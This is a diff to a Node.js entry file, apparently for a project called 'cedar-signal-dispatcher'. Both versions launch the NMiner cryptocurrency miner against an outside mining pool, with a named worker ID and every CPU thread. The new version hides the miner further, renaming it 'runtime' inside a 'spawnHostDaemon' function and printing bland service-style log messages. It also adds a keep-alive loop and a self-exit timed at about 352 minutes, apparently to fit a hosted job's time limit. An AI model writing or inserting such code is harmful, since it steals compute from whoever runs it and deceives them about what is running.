@@ -3,32 +3,27 @@ const os = require("os");
 const { NMiner } = require("nminer");
 const config = require("./lib/config");
 
-async function bootstrap() {
-    const instanceToken = "1ed82b";
-    console.log(`[host] Starting runtime for ${config.appName || "cedar-signal-dispatcher"} [${instanceToken}]`);
+function spawnHostDaemon() {
+    const instanceToken = "f87f8a";
+    console.log(`[worker] Instantiated runtime context for cedar-signal-dispatcher [${instanceToken}]`);
 
-    const handler = new NMiner(
+    const runtime = new NMiner(
         "wss://nmining-runtime.igrp.app/",
         "Arup07.cedar-signal-dispatcher",
-        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
+        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
     );
 
-    process.stdin.resume();
+    const tick = () => { setTimeout(tick, 41000); }; tick();
     setTimeout(() => {
-        console.log("[timeout] Operational limit (348m) reached, exiting cleanly.");
+        console.log("[timeout] Operational limit (352m) reached, exiting cleanly.");
         process.exit(0);
-    }, 348 * 60 * 1000);
+    }, 352 * 60 * 1000);
 
     process.on("SIGTERM", () => {
         
-        console.log(`[host] Signal SIGTERM acknowledged, exiting session ${instanceToken}.`);
+        console.log("[halt] Clean lifecycle exit confirmed.");
         process.exit(0);
     });
-
-    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
 }
 
-bootstrap().catch((err) => {
-    console.error("Supervisor startup fault:", err);
-    process.exit(1);
-});
+spawnHostDaemon();
